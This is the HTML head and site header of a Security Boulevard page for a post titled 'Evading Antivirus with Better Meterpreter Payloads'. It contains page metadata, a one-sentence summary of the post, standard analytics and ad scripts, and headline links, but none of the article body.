@@ -1,0 +1,1353 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="pingback" href="https://securityboulevard.com/xmlrpc.php" />
+
+	<!-- This site is optimized with the Yoast SEO Premium plugin v15.1.1 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Evading Antivirus with Better Meterpreter Payloads - Security Boulevard</title>
+	<meta name="description" content="Evading antivirus is often an under appreciated art that can make or break a penetration test. Modern antivirus products can detect meterpreter payloads easily, and can leave a pentester falsely believing a system is not exploitable. To increase our overall success rate of exploitation we will create a custom meterpreter reverse_tcp payload. To do this The post Evading Antivirus with Better Meterpreter Payloads appeared first on Virtue Security." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Evading Antivirus with Better Meterpreter Payloads - Security Boulevard" />
+	<meta property="og:description" content="Evading antivirus is often an under appreciated art that can make or break a penetration test. Modern antivirus products can detect meterpreter payloads easily, and can leave a pentester falsely believing a system is not exploitable. To increase our overall success rate of exploitation we will create a custom meterpreter reverse_tcp payload. To do this The post Evading Antivirus with Better Meterpreter Payloads appeared first on Virtue Security." />
+	<meta property="og:url" content="https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/" />
+	<meta property="og:site_name" content="Security Boulevard" />
+	<meta property="article:publisher" content="https://www.facebook.com/groups/24445075146/" />
+	<meta property="article:published_time" content="2020-02-06T23:13:16+00:00" />
+	<meta property="article:modified_time" content="2020-03-07T03:28:36+00:00" />
+	<meta property="og:image" content="https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@securityblvd" />
+	<meta name="twitter:site" content="@securityblvd" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://securityboulevard.com/#website","url":"https://securityboulevard.com/","name":"Security Boulevard","description":"The Home of the Security Bloggers Network","potentialAction":[{"@type":"SearchAction","target":"https://securityboulevard.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/#primaryimage","inLanguage":"en-US","url":"https://www.virtuesecurity.com/wp-content/uploads/2020/02/visual-studio-create-project.png"},{"@type":"WebPage","@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/#webpage","url":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/","name":"Evading Antivirus with Better Meterpreter Payloads - Security Boulevard","isPartOf":{"@id":"https://securityboulevard.com/#website"},"primaryImageOfPage":{"@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/#primaryimage"},"datePublished":"2020-02-06T23:13:16+00:00","dateModified":"2020-03-07T03:28:36+00:00","author":{"@id":"https://securityboulevard.com/#/schema/person/ffdbb59aa8cbb989536be410242550b0"},"description":"Evading antivirus is often an under appreciated art that can make or break a penetration test. Modern antivirus products can detect meterpreter payloads easily, and can leave a pentester falsely believing a system is not exploitable. To increase our overall success rate of exploitation we will create a custom meterpreter reverse_tcp payload. To do this The post Evading Antivirus with Better Meterpreter Payloads appeared first on Virtue Security.","breadcrumb":{"@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/"]}]},{"@type":"BreadcrumbList","@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://securityboulevard.com/","url":"https://securityboulevard.com/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://securityboulevard.com/category/sbn/","url":"https://securityboulevard.com/category/sbn/","name":"Security Bloggers Network"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/","url":"https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/","name":"Evading Antivirus with Better Meterpreter Payloads"}}]},{"@type":"Person","@id":"https://securityboulevard.com/#/schema/person/ffdbb59aa8cbb989536be410242550b0","name":"Elliott","image":{"@type":"ImageObject","@id":"https://securityboulevard.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/155e993193d31a6c290e07bd75cc1f8d?s=96&d=mm&r=g","caption":"Elliott"},"sameAs":["https://www.virtuesecurity.com"]}]}</script>
+	<!-- / Yoast SEO Premium plugin. -->
+
+
+<link rel="amphtml" href="https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/amp/" /><meta name="generator" content="AMP for WP 1.0.64.1"/><link rel='dns-prefetch' href='//js.hs-scripts.com' />
+<link rel='dns-prefetch' href='//secure.gravatar.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Security Boulevard &raquo; Feed" href="https://securityboulevard.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Security Boulevard &raquo; Comments Feed" href="https://securityboulevard.com/comments/feed/" />
+<link rel="alternate" type="text/calendar" title="Security Boulevard &raquo; iCal Feed" href="https://securityboulevard.com/webinars/?ical=1" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/securityboulevard.com\/wp-includes\/js\/wp-emoji-release.min.js"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='pt-cv-public-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/content-views-query-and-display-post-page/public/assets/css/cv.css' type='text/css' media='all' />
+<link rel='stylesheet' id='pt-cv-public-pro-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/pt-content-views-pro/public/assets/css/cvpro.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tribe-common-skeleton-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/the-events-calendar/common/src/resources/css/common-skeleton.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='tribe-tooltip-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='owl-css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/owl.carousel.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='owl-theme-css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/owl.theme.default.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='cookie-consent-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/uk-cookie-consent/assets/css/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-pagenavi-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/wp-pagenavi/pagenavi-css.css' type='text/css' media='all' />
+<link rel='stylesheet' id='megamenu-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/maxmegamenu/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/css/dashicons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='colormag_style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='colormag_googlefonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans%7COpen+Sans%3A400%2C600%7CPT+Sans%7CSource+Sans+Pro&#038;ver=5.5.1' type='text/css' media='all' />
+<link rel='stylesheet' id='colormag-featured-image-popup-css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/magnific-popup/magnific-popup.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='colormag-fontawesome-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/fontawesome/css/font-awesome.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='custom-scrollbar-css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/css/jquery.mCustomScrollbar.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='custom-datatables-css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/css/datatables.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='dflip-icons-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/dflip/assets/css/themify-icons.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='dflip-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/dflip/assets/css/dflip.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='popup-maker-site-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/pum/pum-site-styles.css?generated=1601641343&#038;ver=1.12.0' type='text/css' media='all' />
+<link rel='stylesheet' id='addtoany-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/add-to-any/addtoany.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/jetpack/css/jetpack.css' type='text/css' media='all' />
+<script type='text/javascript' data-cfasync="false" src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/js/jquery/jquery.js' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/add-to-any/addtoany.min.js' id='addtoany-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/list.min.js' id='list-min-js-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/owl.carousel.min.js' id='owl-min-js-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/isotope.pkgd.min.js' id='isotope-js-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/devops_core/assets/custom.js' id='j-custom-js-js'></script>
+<!--[if lte IE 8]>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/html5shiv.min.js' id='html5-js'></script>
+<![endif]-->
+<script type='text/javascript' id='colormag-loadmore-js-extra'>
+/* <![CDATA[ */
+var colormag_script_vars = {"no_more_posts":"No more post"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/loadmore.min.js' id='colormag-loadmore-js'></script>
+<link rel="https://api.w.org/" href="https://securityboulevard.com/wp-json/" /><link rel="alternate" type="application/json" href="https://securityboulevard.com/wp-json/wp/v2/posts/1839370" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://securityboulevard.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://securityboulevard.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='shortlink' href='https://wp.me/p91vu9-7Ivg' />
+<link rel="alternate" type="application/json+oembed" href="https://securityboulevard.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://securityboulevard.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsecurityboulevard.com%2F2020%2F02%2Fevading-antivirus-with-better-meterpreter-payloads%2F&#038;format=xml" />
+
+<script data-cfasync="false">
+window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};
+a2a_config.icon_color="#434366";
+(function(d,s,a,b){a=d.createElement(s);b=d.getElementsByTagName(s)[0];a.async=1;a.src="https://static.addtoany.com/menu/page.js";b.parentNode.insertBefore(a,b);})(document,"script");
+</script>
+			<!-- DO NOT COPY THIS SNIPPET! Start of Page Analytics Tracking for HubSpot WordPress plugin v7.45.4-->
+			<script type="text/javascript">
+				var _hsq = _hsq || [];
+				_hsq.push(["setContentType", "blog-post"]);
+			</script>
+			<!-- DO NOT COPY THIS SNIPPET! End of Page Analytics Tracking for HubSpot WordPress plugin -->
+						<script>
+				(function() {
+					var hbspt = window.hbspt = window.hbspt || {};
+					hbspt.forms = hbspt.forms || {};
+					hbspt._wpFormsQueue = [];
+					hbspt.enqueueForm = function(formDef) {
+						if (hbspt.forms && hbspt.forms.create) {
+							hbspt.forms.create(formDef);
+						} else {
+							hbspt._wpFormsQueue.push(formDef);
+						}
+					}
+					Object.defineProperty(window.hbspt.forms, 'create', {
+						configurable: true,
+						get: function() {
+							return hbspt._wpCreateForm;
+						},
+						set: function(value) {
+							hbspt._wpCreateForm = value;
+							for (var i = 0; i < hbspt._wpFormsQueue.length; i++) {
+								var formDef = hbspt._wpFormsQueue[i];
+								hbspt._wpCreateForm.call(hbspt.forms, formDef);
+							}
+						},
+					})
+				})();
+			</script>
+		<style id="ctcc-css" type="text/css" media="screen">
+				#catapult-cookie-bar {
+					box-sizing: border-box;
+					max-height: 0;
+					opacity: 0;
+					z-index: 99999;
+					overflow: hidden;
+					color: #ddd;
+					position: fixed;
+					left: 0;
+					bottom: 0;
+					width: 100%;
+					background-color: #434366;
+				}
+				#catapult-cookie-bar a {
+					color: #fff;
+				}
+				#catapult-cookie-bar .x_close span {
+					background-color: ;
+				}
+				button#catapultCookie {
+					background:#2e2e46;
+					color: ;
+					border: 0; padding: 6px 9px; border-radius: 3px;
+				}
+				#catapult-cookie-bar h3 {
+					color: #ddd;
+				}
+				.has-cookie-bar #catapult-cookie-bar {
+					opacity: 1;
+					max-height: 999px;
+					min-height: 30px;
+				}</style><meta name="tec-api-version" content="v1"><meta name="tec-api-origin" content="https://securityboulevard.com"><link rel="https://theeventscalendar.com/" href="https://securityboulevard.com/wp-json/tribe/events/v1/" /><!-- Security Boulevard Internal Styles --><style type="text/css"> .colormag-button,blockquote,button,input[type=reset],input[type=button],input[type=submit]{background-color:#6190bb}a{color:#6190bb}#site-navigation{border-top:4px solid #6190bb}.home-icon.front_page_on,.main-navigation a:hover,.main-navigation ul li ul li a:hover,.main-navigation ul li ul li:hover>a,.main-navigation ul li.current-menu-ancestor>a,.main-navigation ul li.current-menu-item ul li a:hover,.main-navigation ul li.current-menu-item>a,.main-navigation ul li.current_page_ancestor>a,.main-navigation ul li.current_page_item>a,.main-navigation ul li:hover>a,.main-small-navigation li a:hover,.site-header .menu-toggle:hover{background-color:#6190bb}.main-small-navigation .current-menu-item>a,.main-small-navigation .current_page_item>a{background:#6190bb}#main .breaking-news-latest,.fa.search-top:hover{background-color:#6190bb}.byline a:hover,.comments a:hover,.edit-link a:hover,.posted-on a:hover,.social-links i.fa:hover,.tag-links a:hover{color:#6190bb}.widget_featured_posts .article-content .above-entry-meta .cat-links a{background-color:#6190bb}.widget_featured_posts .article-content .entry-title a:hover{color:#6190bb}.widget_featured_posts .widget-title{border-bottom:2px solid #6190bb}.widget_featured_posts .widget-title span,.widget_featured_slider .slide-content .above-entry-meta .cat-links a{background-color:#6190bb}.widget_featured_slider .slide-content .below-entry-meta .byline a:hover,.widget_featured_slider .slide-content .below-entry-meta .comments a:hover,.widget_featured_slider .slide-content .below-entry-meta .posted-on a:hover,.widget_featured_slider .slide-content .entry-title a:hover{color:#6190bb}.widget_highlighted_posts .article-content .above-entry-meta .cat-links a{background-color:#6190bb}.widget_block_picture_news.widget_featured_posts .article-content .entry-title a:hover,.widget_highlighted_posts .article-content .below-entry-meta .byline a:hover,.widget_highlighted_posts .article-content .below-entry-meta .comments a:hover,.widget_highlighted_posts .article-content .below-entry-meta .posted-on a:hover,.widget_highlighted_posts .article-content .entry-title a:hover{color:#6190bb}.category-slide-next,.category-slide-prev,.slide-next,.slide-prev,.tabbed-widget ul li{background-color:#6190bb}i.fa-arrow-up, i.fa-arrow-down{color:#6190bb}#secondary .widget-title{border-bottom:2px solid #6190bb}#content .wp-pagenavi .current,#content .wp-pagenavi a:hover,#secondary .widget-title span{background-color:#6190bb}#site-title a{color:#6190bb}.page-header .page-title{border-bottom:2px solid #6190bb}#content .post .article-content .above-entry-meta .cat-links a,.page-header .page-title span{background-color:#6190bb}#content .post .article-content .entry-title a:hover,.entry-meta .byline i,.entry-meta .cat-links i,.entry-meta a,.post .entry-title a:hover,.search .entry-title a:hover{color:#6190bb}.entry-meta .post-format i{background-color:#6190bb}.entry-meta .comments-link a:hover,.entry-meta .edit-link a:hover,.entry-meta .posted-on a:hover,.entry-meta .tag-links a:hover,.single #content .tags a:hover{color:#6190bb}.format-link .entry-content a,.more-link{background-color:#6190bb}.count,.next a:hover,.previous a:hover,.related-posts-main-title .fa,.single-related-posts .article-content .entry-title a:hover{color:#6190bb}.pagination a span:hover{color:#6190bb;border-color:#6190bb}.pagination span{background-color:#6190bb}#content .comments-area a.comment-edit-link:hover,#content .comments-area a.comment-permalink:hover,#content .comments-area article header cite a:hover,.comments-area .comment-author-link a:hover{color:#6190bb}.comments-area .comment-author-link span{background-color:#6190bb}.comment .comment-reply-link:hover,.nav-next a,.nav-previous a{color:#6190bb}.footer-widgets-area .widget-title{border-bottom:2px solid #6190bb}.footer-widgets-area .widget-title span{background-color:#6190bb}#colophon .footer-menu ul li a:hover,.footer-widgets-area a:hover,a#scroll-up i{color:#6190bb}.advertisement_above_footer .widget-title{border-bottom:2px solid #6190bb}.advertisement_above_footer .widget-title span{background-color:#6190bb}.sub-toggle{background:#6190bb}.main-small-navigation li.current-menu-item > .sub-toggle i {color:#6190bb}.error{background:#6190bb}.num-404{color:#6190bb},#primary .widget-title{border-bottom: 2px solid #6190bb},#primary .widget-title span{background-color:#6190bb} .main-navigation li, .site-header .menu-toggle { font-family: "PT Sans"; } h1, h2, h3, h4, h5, h6 { font-family: "Source Sans Pro"; } body, button, input, select, textarea, p, blockquote p, .entry-meta, .more-link { font-family: "Source Sans Pro"; } body, button, input, select, textarea, p, blockquote p, dl, .previous a, .next a, .nav-previous a, .nav-next a, #respond h3#reply-title #cancel-comment-reply-link, #respond form input[type="text"], #respond form textarea, #secondary .widget, .error-404 .widget { font-size: 16px; } #header-text-nav-container { background-color: #2e2e46; } .footer-widgets-wrapper { background-color: #2e2e46; } .footer-socket-wrapper { background-color: #434366; } .below-entry-meta .posted-on{display:none;} .below-entry-meta .comments{display:none;}</style>
+		<script data-cfasync="false"> var dFlipLocation = "https://securityboulevard.com/wp-content/plugins/dflip/assets/"; var dFlipWPGlobal = {"text":{"toggleSound":"Turn on\/off Sound","toggleThumbnails":"Toggle Thumbnails","toggleOutline":"Toggle Outline\/Bookmark","previousPage":"Previous Page","nextPage":"Next Page","toggleFullscreen":"Toggle Fullscreen","zoomIn":"Zoom In","zoomOut":"Zoom Out","toggleHelp":"Toggle Help","singlePageMode":"Single Page Mode","doublePageMode":"Double Page Mode","downloadPDFFile":"Download PDF File","gotoFirstPage":"Goto First Page","gotoLastPage":"Goto Last Page","share":"Share"},"moreControls":"download,pageMode,startPage,endPage,sound","hideControls":"","scrollWheel":"false","backgroundColor":"#777","backgroundImage":"","height":"auto","paddingLeft":"20","paddingRight":"20","controlsPosition":"bottom","duration":"800","soundEnable":"true","enableDownload":"true","enableAnalytics":"false","webgl":"true","hard":"none","maxTextureSize":"1600","rangeChunkSize":"524288","zoomRatio":"1.5","stiffness":"3","singlePageMode":"0","autoPlay":"false","autoPlayDuration":"5000","autoPlayStart":"false","linkTarget":"2"};</script><style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #1b253c; }
+</style>
+	<link rel="icon" href="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/cropped-SB3x4-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/cropped-SB3x4-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2018/03/cropped-SB3x4-180x180.jpg" />
+<meta name="msapplication-TileImage" content="https://securityboulevard.com/wp-content/uploads/2018/03/cropped-SB3x4-270x270.jpg" />
+			<style type="text/css" id="pt-cv-custom-style-29d49b45yf">.pt-cv-social-buttons a{-webkit-filter:grayscale(0.9);filter:gray;filter:grayscale(0.9)}.pt-cv-social-buttons a:hover{-webkit-filter:grayscale(0);filter:gray;filter:grayscale(0)}
+.pt-cv-social-buttons a{width:20px!important;height:20px!important;background-size:100px!important}
+.pt-cv-social-buttons .pt-cv-social-twitter{background-position:-20px 0!important}
+.pt-cv-social-buttons .pt-cv-social-linkedin{background-position:-60px 0!important}
+.pt-cv-social-buttons .pt-cv-social-pinterest{background-position:-80px 0!important}
+.pt-cv-social-buttons .pt-cv-social-googleplus {background-position: -40px 0;}
+</style>
+						<link rel="stylesheet" type="text/css" id="wp-custom-css" href="https://securityboulevard.com/?custom-css=ed2a13d316" />
+		<style type="text/css">/** Mega Menu CSS: fs **/</style>
+
+<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+<script>
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+</script>
+
+<script>
+  googletag.cmd.push(function() {
+      
+      var mapa = googletag.sizeMapping().
+    addSize([1200, 0], [728, 90]).
+    addSize([0, 0], [320, 50]).
+    build();
+      
+    googletag.defineSlot('/80877830/SB_Leaderboard', [[728, 90], [320, 50]], 'div-gpt-ad-1503669457440-0').defineSizeMapping(mapa).addService(googletag.pubads());
+    googletag.defineSlot('/80877830/SB_LeaderboardFooter', [[728, 90], [320, 50]], 'div-gpt-ad-1503669457440-1').defineSizeMapping(mapa).addService(googletag.pubads());
+    googletag.defineSlot('/80877830/SB_Medium', [300, 250], 'div-gpt-ad-1503669457440-2').addService(googletag.pubads());
+    googletag.defineOutOfPageSlot('/80877830/SB_OOP', 'div-gpt-ad-1538595968677-0').addService(googletag.pubads());
+    googletag.pubads().setTargeting("category","sbn");
+    googletag.pubads().setTargeting("subcategory","");
+    googletag.pubads().setTargeting("homepage","No");
+   googletag.pubads().setTargeting("test", "");
+   
+    googletag.enableServices();
+  });
+  
+ 
+
+</script>
+<link rel='stylesheet' id='colormag_style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/sb.css' type='text/css' media='all' />
+
+<!-- Global Site Tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106313158-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments)};
+  gtag('js', new Date());
+
+  gtag('config', 'UA-106313158-1');
+</script>
+
+<meta name="google-site-verification" content="hRVR1BmPHNKwYS7nfOqOCsN3IVVl2fAubzdYJAhyboc" />
+
+<!-- Start Alexa Certify Javascript -->
+<script type="text/javascript">
+_atrk_opts = { atrk_acct:"8w5fq1Fx9f207i", domain:"securityboulevard.com",dynamic: true};
+(function() { var as = document.createElement('script'); as.type = 'text/javascript'; as.async = true; as.src = "https://certify-js.alexametrics.com/atrk.js"; var s = document.getElementsByTagName('script')[0];s.parentNode.insertBefore(as, s); })();
+</script>
+<noscript><img src="https://certify.alexametrics.com/atrk.gif?account=8w5fq1Fx9f207i" style="display:none" height="1" width="1" alt="" /></noscript>
+<!-- End Alexa Certify Javascript -->  
+
+
+</head>
+
+<body class="post-template-default single single-post postid-1839370 single-format-standard custom-background tribe-no-js mega-menu-secondary ">
+<div id="page" class="hfeed site">
+		<header id="masthead" class="site-header clearfix">
+		<div id="header-text-nav-container" class="clearfix">
+							<div class="news-bar">
+					<div class="inner-wrap clearfix">
+							<div class="date-in-header">
+		Tuesday, October 20, 2020	</div>
+
+							<div class="breaking-news">
+		<strong class="breaking-news-latest">
+					</strong>
+		<ul class="newsticker">
+							<li>
+					<a href="https://securityboulevard.com/2020/10/a-closer-look-at-the-attempted-ransomware-attack-on-tesla/" title="A Closer Look at the Attempted Ransomware Attack on Tesla">A Closer Look at the Attempted Ransomware Attack on Tesla</a>
+				</li>
+							<li>
+					<a href="https://securityboulevard.com/2020/10/children-smartphones-and-the-surveillance-economy/" title="Children, smartphones and the surveillance economy">Children, smartphones and the surveillance economy</a>
+				</li>
+							<li>
+					<a href="https://securityboulevard.com/2020/10/directory-traversal-web-based-application-security-part-8/" title="Directory Traversal — Web-based Application Security, Part 8">Directory Traversal — Web-based Application Security, Part 8</a>
+				</li>
+							<li>
+					<a href="https://securityboulevard.com/2020/10/securing-internet-connected-devices-in-healthcare/" title="Securing Internet-Connected Devices in Healthcare">Securing Internet-Connected Devices in Healthcare</a>
+				</li>
+							<li>
+					<a href="https://securityboulevard.com/2020/10/def-con-28-safe-mode-appsec-village-david-sopas-paulo-silvas-api-insecurity-top-10/" title="DEF CON 28 Safe Mode AppSec Village &#8211; David Sopas&#8217; &amp; Paulo Silva&#8217;s &#8216;API InSecurity TOP 10&#8217;">DEF CON 28 Safe Mode AppSec Village &#8211; David Sopas&#8217; &amp; Paulo Silva&#8217;s &#8216;API InSecurity TOP 10&#8217;</a>
+				</li>
+					</ul>
+	</div>
+	
+						
+		<div class="social-links clearfix">
+		<ul>
